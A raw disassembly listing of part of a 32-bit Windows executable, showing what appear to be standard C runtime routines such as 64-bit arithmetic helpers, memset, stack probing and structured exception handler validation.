  40d50a:	f7 e1                	mul    %ecx
  40d50c:	8b d8                	mov    %eax,%ebx
  40d50e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d512:	f7 64 24 14          	mull   0x14(%esp)
  40d516:	03 d8                	add    %eax,%ebx
  40d518:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d51c:	f7 e1                	mul    %ecx
  40d51e:	03 d3                	add    %ebx,%edx
  40d520:	5b                   	pop    %ebx
  40d521:	c2 10 00             	ret    $0x10
  40d524:	cc                   	int3
  40d525:	cc                   	int3
  40d526:	cc                   	int3
  40d527:	cc                   	int3
  40d528:	cc                   	int3
  40d529:	cc                   	int3
  40d52a:	cc                   	int3
  40d52b:	cc                   	int3
  40d52c:	cc                   	int3
  40d52d:	cc                   	int3
  40d52e:	cc                   	int3
  40d52f:	cc                   	int3
  40d530:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40d534:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40d538:	85 d2                	test   %edx,%edx
  40d53a:	74 69                	je     0x40d5a5
  40d53c:	33 c0                	xor    %eax,%eax
  40d53e:	8a 44 24 08          	mov    0x8(%esp),%al
  40d542:	84 c0                	test   %al,%al
  40d544:	75 16                	jne    0x40d55c
  40d546:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40d54c:	72 0e                	jb     0x40d55c
  40d54e:	83 3d 28 81 42 00 00 	cmpl   $0x0,0x428128
  40d555:	74 05                	je     0x40d55c
  40d557:	e9 2d 06 00 00       	jmp    0x40db89
  40d55c:	57                   	push   %edi
  40d55d:	8b f9                	mov    %ecx,%edi
  40d55f:	83 fa 04             	cmp    $0x4,%edx
  40d562:	72 31                	jb     0x40d595
  40d564:	f7 d9                	neg    %ecx
  40d566:	83 e1 03             	and    $0x3,%ecx
  40d569:	74 0c                	je     0x40d577
  40d56b:	2b d1                	sub    %ecx,%edx
  40d56d:	88 07                	mov    %al,(%edi)
  40d56f:	83 c7 01             	add    $0x1,%edi
  40d572:	83 e9 01             	sub    $0x1,%ecx
  40d575:	75 f6                	jne    0x40d56d
  40d577:	8b c8                	mov    %eax,%ecx
  40d579:	c1 e0 08             	shl    $0x8,%eax
  40d57c:	03 c1                	add    %ecx,%eax
  40d57e:	8b c8                	mov    %eax,%ecx
  40d580:	c1 e0 10             	shl    $0x10,%eax
  40d583:	03 c1                	add    %ecx,%eax
  40d585:	8b ca                	mov    %edx,%ecx
  40d587:	83 e2 03             	and    $0x3,%edx
  40d58a:	c1 e9 02             	shr    $0x2,%ecx
  40d58d:	74 06                	je     0x40d595
  40d58f:	f3 ab                	rep stos %eax,%es:(%edi)
  40d591:	85 d2                	test   %edx,%edx
  40d593:	74 0a                	je     0x40d59f
  40d595:	88 07                	mov    %al,(%edi)
  40d597:	83 c7 01             	add    $0x1,%edi
  40d59a:	83 ea 01             	sub    $0x1,%edx
  40d59d:	75 f6                	jne    0x40d595
  40d59f:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d5a3:	5f                   	pop    %edi
  40d5a4:	c3                   	ret
  40d5a5:	8b 44 24 04          	mov    0x4(%esp),%eax
  40d5a9:	c3                   	ret
  40d5aa:	cc                   	int3
  40d5ab:	cc                   	int3
  40d5ac:	cc                   	int3
  40d5ad:	cc                   	int3
  40d5ae:	cc                   	int3
  40d5af:	cc                   	int3
  40d5b0:	51                   	push   %ecx
  40d5b1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40d5b5:	2b c8                	sub    %eax,%ecx
  40d5b7:	1b c0                	sbb    %eax,%eax
  40d5b9:	f7 d0                	not    %eax
  40d5bb:	23 c8                	and    %eax,%ecx
  40d5bd:	8b c4                	mov    %esp,%eax
  40d5bf:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  40d5c4:	3b c8                	cmp    %eax,%ecx
  40d5c6:	72 0a                	jb     0x40d5d2
  40d5c8:	8b c1                	mov    %ecx,%eax
  40d5ca:	59                   	pop    %ecx
  40d5cb:	94                   	xchg   %eax,%esp
  40d5cc:	8b 00                	mov    (%eax),%eax
  40d5ce:	89 04 24             	mov    %eax,(%esp)
  40d5d1:	c3                   	ret
  40d5d2:	2d 00 10 00 00       	sub    $0x1000,%eax
  40d5d7:	85 00                	test   %eax,(%eax)
  40d5d9:	eb e9                	jmp    0x40d5c4
  40d5db:	cc                   	int3
  40d5dc:	cc                   	int3
  40d5dd:	cc                   	int3
  40d5de:	cc                   	int3
  40d5df:	cc                   	int3
  40d5e0:	53                   	push   %ebx
  40d5e1:	57                   	push   %edi
  40d5e2:	33 ff                	xor    %edi,%edi
  40d5e4:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d5e8:	0b c0                	or     %eax,%eax
  40d5ea:	7d 14                	jge    0x40d600
  40d5ec:	47                   	inc    %edi
  40d5ed:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40d5f1:	f7 d8                	neg    %eax
  40d5f3:	f7 da                	neg    %edx
  40d5f5:	83 d8 00             	sbb    $0x0,%eax
  40d5f8:	89 44 24 10          	mov    %eax,0x10(%esp)
  40d5fc:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40d600:	8b 44 24 18          	mov    0x18(%esp),%eax
  40d604:	0b c0                	or     %eax,%eax
  40d606:	7d 13                	jge    0x40d61b
  40d608:	8b 54 24 14          	mov    0x14(%esp),%edx
  40d60c:	f7 d8                	neg    %eax
  40d60e:	f7 da                	neg    %edx
  40d610:	83 d8 00             	sbb    $0x0,%eax
  40d613:	89 44 24 18          	mov    %eax,0x18(%esp)
  40d617:	89 54 24 14          	mov    %edx,0x14(%esp)
  40d61b:	0b c0                	or     %eax,%eax
  40d61d:	75 1b                	jne    0x40d63a
  40d61f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40d623:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d627:	33 d2                	xor    %edx,%edx
  40d629:	f7 f1                	div    %ecx
  40d62b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d62f:	f7 f1                	div    %ecx
  40d631:	8b c2                	mov    %edx,%eax
  40d633:	33 d2                	xor    %edx,%edx
  40d635:	4f                   	dec    %edi
  40d636:	79 4e                	jns    0x40d686
  40d638:	eb 53                	jmp    0x40d68d
  40d63a:	8b d8                	mov    %eax,%ebx
  40d63c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40d640:	8b 54 24 10          	mov    0x10(%esp),%edx
  40d644:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d648:	d1 eb                	shr    $1,%ebx
  40d64a:	d1 d9                	rcr    $1,%ecx
  40d64c:	d1 ea                	shr    $1,%edx
  40d64e:	d1 d8                	rcr    $1,%eax
  40d650:	0b db                	or     %ebx,%ebx
  40d652:	75 f4                	jne    0x40d648
  40d654:	f7 f1                	div    %ecx
  40d656:	8b c8                	mov    %eax,%ecx
  40d658:	f7 64 24 18          	mull   0x18(%esp)
  40d65c:	91                   	xchg   %eax,%ecx
  40d65d:	f7 64 24 14          	mull   0x14(%esp)
  40d661:	03 d1                	add    %ecx,%edx
  40d663:	72 0e                	jb     0x40d673
  40d665:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40d669:	77 08                	ja     0x40d673
  40d66b:	72 0e                	jb     0x40d67b
  40d66d:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40d671:	76 08                	jbe    0x40d67b
  40d673:	2b 44 24 14          	sub    0x14(%esp),%eax
  40d677:	1b 54 24 18          	sbb    0x18(%esp),%edx
  40d67b:	2b 44 24 0c          	sub    0xc(%esp),%eax
  40d67f:	1b 54 24 10          	sbb    0x10(%esp),%edx
  40d683:	4f                   	dec    %edi
  40d684:	79 07                	jns    0x40d68d
  40d686:	f7 da                	neg    %edx
  40d688:	f7 d8                	neg    %eax
  40d68a:	83 da 00             	sbb    $0x0,%edx
  40d68d:	5f                   	pop    %edi
  40d68e:	5b                   	pop    %ebx
  40d68f:	c2 10 00             	ret    $0x10
  40d692:	56                   	push   %esi
  40d693:	8b 74 24 08          	mov    0x8(%esp),%esi
  40d697:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  40d69d:	75 25                	jne    0x40d6c4
  40d69f:	83 3d 20 81 42 00 00 	cmpl   $0x0,0x428120
  40d6a6:	74 1c                	je     0x40d6c4
  40d6a8:	68 20 81 42 00       	push   $0x428120
  40d6ad:	e8 9e f8 ff ff       	call   0x40cf50
  40d6b2:	85 c0                	test   %eax,%eax
  40d6b4:	59                   	pop    %ecx
  40d6b5:	74 0d                	je     0x40d6c4
  40d6b7:	ff 74 24 0c          	push   0xc(%esp)
  40d6bb:	56                   	push   %esi
  40d6bc:	ff 15 20 81 42 00    	call   *0x428120
  40d6c2:	59                   	pop    %ecx
  40d6c3:	59                   	pop    %ecx
  40d6c4:	5e                   	pop    %esi
  40d6c5:	c3                   	ret
  40d6c6:	cc                   	int3
  40d6c7:	cc                   	int3
  40d6c8:	cc                   	int3
  40d6c9:	cc                   	int3
  40d6ca:	cc                   	int3
  40d6cb:	cc                   	int3
  40d6cc:	cc                   	int3
  40d6cd:	cc                   	int3
  40d6ce:	cc                   	int3
  40d6cf:	cc                   	int3
  40d6d0:	53                   	push   %ebx
  40d6d1:	55                   	push   %ebp
  40d6d2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  40d6d6:	33 c0                	xor    %eax,%eax
  40d6d8:	83 ca ff             	or     $0xffffffff,%edx
  40d6db:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40d6de:	56                   	push   %esi
  40d6df:	0f 84 8d 00 00 00    	je     0x40d772
  40d6e5:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  40d6e8:	8b 74 8d 08          	mov    0x8(%ebp,%ecx,4),%esi
  40d6ec:	8d 5c 8d 00          	lea    0x0(%ebp,%ecx,4),%ebx
  40d6f0:	2b f7                	sub    %edi,%esi
  40d6f2:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  40d6f8:	3b f2                	cmp    %edx,%esi
  40d6fa:	74 2d                	je     0x40d729
  40d6fc:	85 c0                	test   %eax,%eax
  40d6fe:	74 10                	je     0x40d710
  40d700:	8b 48 0c             	mov    0xc(%eax),%ecx
  40d703:	3b f1                	cmp    %ecx,%esi
  40d705:	72 09                	jb     0x40d710
  40d707:	8b 50 08             	mov    0x8(%eax),%edx
  40d70a:	03 d1                	add    %ecx,%edx
  40d70c:	3b f2                	cmp    %edx,%esi
  40d70e:	72 17                	jb     0x40d727
  40d710:	56                   	push   %esi
  40d711:	57                   	push   %edi
  40d712:	e8 e9 f7 ff ff       	call   0x40cf00
  40d717:	83 c4 08             	add    $0x8,%esp
  40d71a:	85 c0                	test   %eax,%eax
  40d71c:	74 5d                	je     0x40d77b
  40d71e:	f7 40 24 00 00 00 20 	testl  $0x20000000,0x24(%eax)
  40d725:	74 54                	je     0x40d77b
  40d727:	8b d6                	mov    %esi,%edx
  40d729:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40d72c:	85 c9                	test   %ecx,%ecx
  40d72e:	74 37                	je     0x40d767
  40d730:	2b cf                	sub    %edi,%ecx
  40d732:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  40d738:	8b f1                	mov    %ecx,%esi
  40d73a:	3b f2                	cmp    %edx,%esi
  40d73c:	74 29                	je     0x40d767
  40d73e:	8b 48 0c             	mov    0xc(%eax),%ecx
  40d741:	3b f1                	cmp    %ecx,%esi
  40d743:	72 09                	jb     0x40d74e
  40d745:	8b 50 08             	mov    0x8(%eax),%edx
  40d748:	03 d1                	add    %ecx,%edx
  40d74a:	3b f2                	cmp    %edx,%esi
  40d74c:	72 17                	jb     0x40d765
  40d74e:	56                   	push   %esi
  40d74f:	57                   	push   %edi
  40d750:	e8 ab f7 ff ff       	call   0x40cf00
  40d755:	83 c4 08             	add    $0x8,%esp
  40d758:	85 c0                	test   %eax,%eax
  40d75a:	74 1f                	je     0x40d77b
  40d75c:	f7 40 24 00 00 00 20 	testl  $0x20000000,0x24(%eax)
  40d763:	74 16                	je     0x40d77b
  40d765:	8b d6                	mov    %esi,%edx
  40d767:	8b 0b                	mov    (%ebx),%ecx
  40d769:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40d76c:	0f 85 73 ff ff ff    	jne    0x40d6e5
  40d772:	5e                   	pop    %esi
  40d773:	5d                   	pop    %ebp
  40d774:	b8 01 00 00 00       	mov    $0x1,%eax
  40d779:	5b                   	pop    %ebx
  40d77a:	c3                   	ret
  40d77b:	5e                   	pop    %esi
  40d77c:	5d                   	pop    %ebp
  40d77d:	33 c0                	xor    %eax,%eax
  40d77f:	5b                   	pop    %ebx
  40d780:	c3                   	ret
  40d781:	cc                   	int3
  40d782:	cc                   	int3
  40d783:	cc                   	int3
  40d784:	cc                   	int3
  40d785:	cc                   	int3
  40d786:	cc                   	int3
  40d787:	cc                   	int3
  40d788:	cc                   	int3
  40d789:	cc                   	int3
  40d78a:	cc                   	int3
  40d78b:	cc                   	int3
  40d78c:	cc                   	int3
  40d78d:	cc                   	int3
  40d78e:	cc                   	int3
  40d78f:	cc                   	int3
  40d790:	55                   	push   %ebp
  40d791:	8b ec                	mov    %esp,%ebp
  40d793:	6a fe                	push   $0xfffffffe
  40d795:	68 60 f7 40 00       	push   $0x40f760
  40d79a:	68 d0 cb 40 00       	push   $0x40cbd0
  40d79f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40d7a5:	50                   	push   %eax
  40d7a6:	83 ec 30             	sub    $0x30,%esp
  40d7a9:	53                   	push   %ebx
  40d7aa:	56                   	push   %esi
  40d7ab:	57                   	push   %edi
  40d7ac:	a1 00 10 41 00       	mov    0x411000,%eax
  40d7b1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  40d7b4:	33 c5                	xor    %ebp,%eax
  40d7b6:	50                   	push   %eax
  40d7b7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40d7ba:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40d7c0:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40d7c3:	8b 75 08             	mov    0x8(%ebp),%esi
  40d7c6:	8b 56 08             	mov    0x8(%esi),%edx
  40d7c9:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40d7cc:	f6 c2 03             	test   $0x3,%dl
  40d7cf:	74 14                	je     0x40d7e5
  40d7d1:	33 c0                	xor    %eax,%eax
  40d7d3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40d7d6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40d7dd:	59                   	pop    %ecx
  40d7de:	5f                   	pop    %edi
  40d7df:	5e                   	pop    %esi
  40d7e0:	5b                   	pop    %ebx
  40d7e1:	8b e5                	mov    %ebp,%esp
  40d7e3:	5d                   	pop    %ebp
  40d7e4:	c3                   	ret
  40d7e5:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  40d7eb:	8b 48 08             	mov    0x8(%eax),%ecx
  40d7ee:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40d7f1:	3b d1                	cmp    %ecx,%edx
  40d7f3:	72 05                	jb     0x40d7fa
  40d7f5:	3b 50 04             	cmp    0x4(%eax),%edx
  40d7f8:	72 d7                	jb     0x40d7d1
  40d7fa:	8b 7e 0c             	mov    0xc(%esi),%edi
  40d7fd:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40d800:	83 ff ff             	cmp    $0xffffffff,%edi
  40d803:	0f 84 12 03 00 00    	je     0x40db1b
  40d809:	33 db                	xor    %ebx,%ebx
  40d80b:	33 c0                	xor    %eax,%eax
  40d80d:	8b ca                	mov    %edx,%ecx
  40d80f:	90                   	nop
  40d810:	8b 31                	mov    (%ecx),%esi
  40d812:	83 fe ff             	cmp    $0xffffffff,%esi
  40d815:	74 04                	je     0x40d81b
  40d817:	3b f0                	cmp    %eax,%esi
  40d819:	73 b6                	jae    0x40d7d1
  40d81b:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  40d81f:	74 05                	je     0x40d826
  40d821:	bb 01 00 00 00       	mov    $0x1,%ebx
  40d826:	83 c0 01             	add    $0x1,%eax
  40d829:	83 c1 0c             	add    $0xc,%ecx
  40d82c:	3b c7                	cmp    %edi,%eax
  40d82e:	76 e0                	jbe    0x40d810
  40d830:	85 db                	test   %ebx,%ebx
  40d832:	74 0f                	je     0x40d843
  40d834:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d837:	8b 41 f8             	mov    -0x8(%ecx),%eax
  40d83a:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40d83d:	72 92                	jb     0x40d7d1
  40d83f:	3b c1                	cmp    %ecx,%eax
  40d841:	73 8e                	jae    0x40d7d1
  40d843:	8b c2                	mov    %edx,%eax
  40d845:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  40d84a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40d84d:	33 f6                	xor    %esi,%esi
  40d84f:	a1 f8 7f 42 00       	mov    0x427ff8,%eax
  40d854:	3b f0                	cmp    %eax,%esi
  40d856:	0f 8d 41 01 00 00    	jge    0x40d99d
  40d85c:	8b 1c f5 00 80 42 00 	mov    0x428000(,%esi,8),%ebx
  40d863:	8b 3c f5 04 80 42 00 	mov    0x428004(,%esi,8),%edi
  40d86a:	3b 5d e0             	cmp    -0x20(%ebp),%ebx
  40d86d:	0f 85 7e 01 00 00    	jne    0x40d9f1
  40d873:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40d87a:	57                   	push   %edi
  40d87b:	e8 50 f6 ff ff       	call   0x40ced0
  40d880:	83 c4 04             	add    $0x4,%esp
  40d883:	85 c0                	test   %eax,%eax
  40d885:	0f 84 08 01 00 00    	je     0x40d993
  40d88b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40d88e:	50                   	push   %eax
  40d88f:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40d892:	e8 39 fe ff ff       	call   0x40d6d0
  40d897:	83 c4 04             	add    $0x4,%esp
  40d89a:	85 c0                	test   %eax,%eax
  40d89c:	0f 84 f1 00 00 00    	je     0x40d993
  40d8a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d8a5:	8b 51 04             	mov    0x4(%ecx),%edx
  40d8a8:	2b d7                	sub    %edi,%edx
  40d8aa:	52                   	push   %edx
  40d8ab:	57                   	push   %edi
  40d8ac:	e8 4f f6 ff ff       	call   0x40cf00
  40d8b1:	83 c4 08             	add    $0x8,%esp
  40d8b4:	85 c0                	test   %eax,%eax
  40d8b6:	0f 84 d7 00 00 00    	je     0x40d993
  40d8bc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40d8c3:	85 f6                	test   %esi,%esi
  40d8c5:	0f 8e 50 02 00 00    	jle    0x40db1b
  40d8cb:	b8 01 00 00 00       	mov    $0x1,%eax
  40d8d0:	b9 80 80 42 00       	mov    $0x428080,%ecx
  40d8d5:	87 01                	xchg   %eax,(%ecx)
  40d8d7:	85 c0                	test   %eax,%eax
  40d8d9:	0f 85 3c 02 00 00    	jne    0x40db1b
  40d8df:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40d8e2:	39 04 f5 00 80 42 00 	cmp    %eax,0x428000(,%esi,8)
  40d8e9:	74 48                	je     0x40d933
  40d8eb:	8b 0d f8 7f 42 00    	mov    0x427ff8,%ecx
  40d8f1:	8d 71 ff             	lea    -0x1(%ecx),%esi
  40d8f4:	85 f6                	test   %esi,%esi
  40d8f6:	7c 2a                	jl     0x40d922
  40d8f8:	eb 06                	jmp    0x40d900
  40d8fa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40d900:	39 04 f5 00 80 42 00 	cmp    %eax,0x428000(,%esi,8)
  40d907:	74 07                	je     0x40d910
  40d909:	83 ee 01             	sub    $0x1,%esi
  40d90c:	79 f2                	jns    0x40d900
  40d90e:	eb 0e                	jmp    0x40d91e
  40d910:	8b 1c f5 00 80 42 00 	mov    0x428000(,%esi,8),%ebx
  40d917:	8b 3c f5 04 80 42 00 	mov    0x428004(,%esi,8),%edi
  40d91e:	85 f6                	test   %esi,%esi
  40d920:	7d 13                	jge    0x40d935
  40d922:	83 f9 10             	cmp    $0x10,%ecx
  40d925:	7d 09                	jge    0x40d930
  40d927:	83 c1 01             	add    $0x1,%ecx
  40d92a:	89 0d f8 7f 42 00    	mov    %ecx,0x427ff8
  40d930:	8d 71 ff             	lea    -0x1(%ecx),%esi
  40d933:	85 f6                	test   %esi,%esi
  40d935:	0f 8e d7 01 00 00    	jle    0x40db12
  40d93b:	33 c0                	xor    %eax,%eax
  40d93d:	85 f6                	test   %esi,%esi
  40d93f:	0f 8c cd 01 00 00    	jl     0x40db12
  40d945:	eb 09                	jmp    0x40d950
  40d947:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d94e:	8b ff                	mov    %edi,%edi
  40d950:	8b 0c c5 00 80 42 00 	mov    0x428000(,%eax,8),%ecx
  40d957:	8b 14 c5 04 80 42 00 	mov    0x428004(,%eax,8),%edx
  40d95e:	89 1c c5 00 80 42 00 	mov    %ebx,0x428000(,%eax,8)
  40d965:	89 3c c5 04 80 42 00 	mov    %edi,0x428004(,%eax,8)
  40d96c:	8b d9                	mov    %ecx,%ebx
  40d96e:	8b fa                	mov    %edx,%edi
  40d970:	83 c0 01             	add    $0x1,%eax
  40d973:	3b c6                	cmp    %esi,%eax
  40d975:	7e d9                	jle    0x40d950
  40d977:	e9 96 01 00 00       	jmp    0x40db12
  40d97c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40d97f:	8b 11                	mov    (%ecx),%edx
  40d981:	8b 02                	mov    (%edx),%eax
  40d983:	33 c9                	xor    %ecx,%ecx
  40d985:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40d98a:	0f 94 c1             	sete   %cl
  40d98d:	8b c1                	mov    %ecx,%eax
  40d98f:	c3                   	ret
  40d990:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40d993:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40d99a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40d99d:	6a 1c                	push   $0x1c
  40d99f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40d9a2:	50                   	push   %eax
  40d9a3:	52                   	push   %edx
  40d9a4:	ff 15 dc e0 40 00    	call   *0x40e0dc
  40d9aa:	85 c0                	test   %eax,%eax
  40d9ac:	0f 84 69 01 00 00    	je     0x40db1b
  40d9b2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40d9b5:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  40d9ba:	74 64                	je     0x40da20
  40d9bc:	3d 00 00 02 00       	cmp    $0x20000,%eax
  40d9c1:	75 48                	jne    0x40da0b
  40d9c3:	83 3d fc 7f 42 00 00 	cmpl   $0x0,0x427ffc
  40d9ca:	75 36                	jne    0x40da02
  40d9cc:	c7 05 88 80 42 00 94 	movl   $0x94,0x428088
  40d9d3:	00 00 00 
  40d9d6:	68 88 80 42 00       	push   $0x428088
  40d9db:	ff 15 2c e0 40 00    	call   *0x40e02c
  40d9e1:	85 c0                	test   %eax,%eax
  40d9e3:	74 14                	je     0x40d9f9
  40d9e5:	c7 05 fc 7f 42 00 01 	movl   $0x1,0x427ffc
  40d9ec:	00 00 00 
  40d9ef:	eb 11                	jmp    0x40da02
  40d9f1:	83 c6 01             	add    $0x1,%esi
  40d9f4:	e9 5b fe ff ff       	jmp    0x40d854
  40d9f9:	83 3d fc 7f 42 00 00 	cmpl   $0x0,0x427ffc
  40da00:	74 1e                	je     0x40da20
  40da02:	83 3d 98 80 42 00 01 	cmpl   $0x1,0x428098
  40da09:	74 15                	je     0x40da20
  40da0b:	83 c8 ff             	or     $0xffffffff,%eax
  40da0e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40da11:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40da18:	59                   	pop    %ecx
  40da19:	5f                   	pop    %edi
  40da1a:	5e                   	pop    %esi
  40da1b:	5b                   	pop    %ebx
  40da1c:	8b e5                	mov    %ebp,%esp
  40da1e:	5d                   	pop    %ebp
  40da1f:	c3                   	ret
  40da20:	8b 7d c4             	mov    -0x3c(%ebp),%edi
  40da23:	57                   	push   %edi
  40da24:	e8 a7 f4 ff ff       	call   0x40ced0
  40da29:	83 c4 04             	add    $0x4,%esp
  40da2c:	85 c0                	test   %eax,%eax
  40da2e:	74 db                	je     0x40da0b
  40da30:	f6 45 d4 cc          	testb  $0xcc,-0x2c(%ebp)
  40da34:	74 24                	je     0x40da5a
  40da36:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40da39:	2b cf                	sub    %edi,%ecx
  40da3b:	51                   	push   %ecx
  40da3c:	57                   	push   %edi
  40da3d:	e8 be f4 ff ff       	call   0x40cf00
  40da42:	83 c4 08             	add    $0x8,%esp
  40da45:	85 c0                	test   %eax,%eax
  40da47:	0f 84 84 fd ff ff    	je     0x40d7d1
  40da4d:	f7 40 24 00 00 00 80 	testl  $0x80000000,0x24(%eax)
  40da54:	0f 85 77 fd ff ff    	jne    0x40d7d1
  40da5a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40da5d:	52                   	push   %edx
  40da5e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40da61:	e8 6a fc ff ff       	call   0x40d6d0
  40da66:	83 c4 04             	add    $0x4,%esp
  40da69:	85 c0                	test   %eax,%eax
  40da6b:	0f 84 60 fd ff ff    	je     0x40d7d1
  40da71:	8b 45 08             	mov    0x8(%ebp),%eax
  40da74:	8b 48 04             	mov    0x4(%eax),%ecx
  40da77:	2b cf                	sub    %edi,%ecx
  40da79:	51                   	push   %ecx
  40da7a:	57                   	push   %edi
  40da7b:	e8 80 f4 ff ff       	call   0x40cf00
  40da80:	83 c4 08             	add    $0x8,%esp
  40da83:	85 c0                	test   %eax,%eax
  40da85:	0f 84 46 fd ff ff    	je     0x40d7d1
  40da8b:	ba 01 00 00 00       	mov    $0x1,%edx
  40da90:	b8 80 80 42 00       	mov    $0x428080,%eax
  40da95:	87 10                	xchg   %edx,(%eax)
  40da97:	85 d2                	test   %edx,%edx
  40da99:	0f 85 7c 00 00 00    	jne    0x40db1b
  40da9f:	8b 35 f8 7f 42 00    	mov    0x427ff8,%esi
  40daa5:	8b c6                	mov    %esi,%eax
  40daa7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40daaa:	85 f6                	test   %esi,%esi
  40daac:	7e 15                	jle    0x40dac3
  40daae:	8d 14 f5 f8 7f 42 00 	lea    0x427ff8(,%esi,8),%edx
  40dab5:	39 0a                	cmp    %ecx,(%edx)
  40dab7:	74 0a                	je     0x40dac3
  40dab9:	83 e8 01             	sub    $0x1,%eax
  40dabc:	83 ea 08             	sub    $0x8,%edx
  40dabf:	85 c0                	test   %eax,%eax
  40dac1:	7f f2                	jg     0x40dab5
  40dac3:	85 c0                	test   %eax,%eax
  40dac5:	75 41                	jne    0x40db08
  40dac7:	83 fe 0f             	cmp    $0xf,%esi
  40daca:	7e 05                	jle    0x40dad1
  40dacc:	be 0f 00 00 00       	mov    $0xf,%esi
  40dad1:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40dad4:	85 f6                	test   %esi,%esi
  40dad6:	7c 1e                	jl     0x40daf6
  40dad8:	b8 00 80 42 00       	mov    $0x428000,%eax
  40dadd:	8d 5e 01             	lea    0x1(%esi),%ebx
  40dae0:	8b 30                	mov    (%eax),%esi
  40dae2:	8b 78 04             	mov    0x4(%eax),%edi
  40dae5:	89 08                	mov    %ecx,(%eax)
  40dae7:	89 50 04             	mov    %edx,0x4(%eax)
  40daea:	8b ce                	mov    %esi,%ecx
  40daec:	8b d7                	mov    %edi,%edx
  40daee:	83 c0 08             	add    $0x8,%eax
  40daf1:	83 eb 01             	sub    $0x1,%ebx
  40daf4:	75 ea                	jne    0x40dae0
  40daf6:	83 3d f8 7f 42 00 10 	cmpl   $0x10,0x427ff8
  40dafd:	7d 13                	jge    0x40db12
  40daff:	83 05 f8 7f 42 00 01 	addl   $0x1,0x427ff8
  40db06:	eb 0a                	jmp    0x40db12
  40db08:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40db0b:	89 0c c5 fc 7f 42 00 	mov    %ecx,0x427ffc(,%eax,8)
  40db12:	b8 80 80 42 00       	mov    $0x428080,%eax
  40db17:	33 d2                	xor    %edx,%edx
  40db19:	87 10                	xchg   %edx,(%eax)
  40db1b:	b8 01 00 00 00       	mov    $0x1,%eax
  40db20:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40db23:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40db2a:	59                   	pop    %ecx
  40db2b:	5f                   	pop    %edi
  40db2c:	5e                   	pop    %esi
  40db2d:	5b                   	pop    %ebx
  40db2e:	8b e5                	mov    %ebp,%esp
  40db30:	5d                   	pop    %ebp
  40db31:	c3                   	ret
  40db32:	55                   	push   %ebp
  40db33:	8b ec                	mov    %esp,%ebp
  40db35:	83 ec 04             	sub    $0x4,%esp
  40db38:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40db3b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40db3e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40db41:	c1 e9 07             	shr    $0x7,%ecx
  40db44:	66 0f ef c0          	pxor   %xmm0,%xmm0
  40db48:	eb 08                	jmp    0x40db52
  40db4a:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40db51:	90                   	nop
  40db52:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  40db56:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
